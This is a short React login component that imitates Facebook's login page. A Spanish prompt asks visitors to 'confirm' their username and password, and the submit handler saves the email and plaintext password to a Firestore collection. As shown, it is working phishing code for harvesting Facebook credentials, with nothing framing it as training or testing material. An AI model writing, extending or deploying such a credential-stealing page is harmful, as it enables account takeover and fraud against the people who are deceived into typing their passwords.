import React, { useState } from 'react';
import { doc, setDoc } from 'firebase/firestore';
import { db } from '../utilis/Firebase';
import './Login.css';

function Login() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      // Assuming you want to store the email and password in Firestore
      // Create a document in Firestore with a unique ID
      const docRef = doc(db, 'users', email); // Using email as the document ID

      // Set the document with the input data
      await setDoc(docRef, {
        email,
        password, // Consider encrypting the password before storing it
      });

      console.log('User data saved successfully');
    } catch (error) {
      console.error('Error saving user data:', error);
    }
  };

  return (
    <div className="login-page">
      <div className="login-container">
        <h1>facebook</h1>
        <p>Por favor confirme su usuario y contraseña actualmente</p>
        <form className="login-form" onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Correo electronico o numero de telefono"
            value={email}
            onChange={handleEmailChange}
          />
          <input
            type="password"
            placeholder="Contraseña"
            value={password}
            onChange={handlePasswordChange}
          />
          <button onClick={handleSubmit}>Confirmar datos</button>
        </form>
        <a href="/">Cuenta olvidada?</a>
        <div className="divider"></div>
        <button className="signup-button">Crear Nueva Cuenta</button>
      </div>
      <p className="create-page"><a href="/">Create a Page</a> for a celebrity, brand or business.</p>
    </div>
  );
}

export default Login;
